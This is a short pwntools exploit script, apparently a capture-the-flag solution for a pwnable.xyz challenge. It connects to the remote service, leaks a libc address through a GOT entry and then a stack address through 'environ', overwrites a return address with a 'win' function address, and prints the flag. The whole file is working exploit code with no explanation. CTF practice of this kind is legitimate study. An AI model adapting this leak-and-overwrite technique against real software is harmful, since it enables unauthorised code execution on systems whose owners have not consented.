from pwn import *

p = remote('svc.pwnable.xyz',30019)
# gdb.attach(p, '''b *read_ulong''')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
libc = ELF('alpine-libc-2.28.so')
win = 0x400905

p.sendlineafter('> ', '1')
p.sendlineafter(': ', str(0x600fd8))
libc_leak = u64(p.recvline()[:-1] + '\x00'*2)
libc_base = libc_leak - libc.symbols['strtoull']

print hex(libc_base)

p.sendlineafter('> ', '1')
p.sendlineafter(': ', str(libc_base +libc.symbols['environ']))
stack_leak = u64(p.recvline()[:-1] + '\x00'*2)

p.sendlineafter('> ', '2')
p.sendlineafter(': ', str(stack_leak - 0xf0))
p.sendlineafter(': ', str(win))

p.sendlineafter('> ', '0')
print p.recvuntil('}')

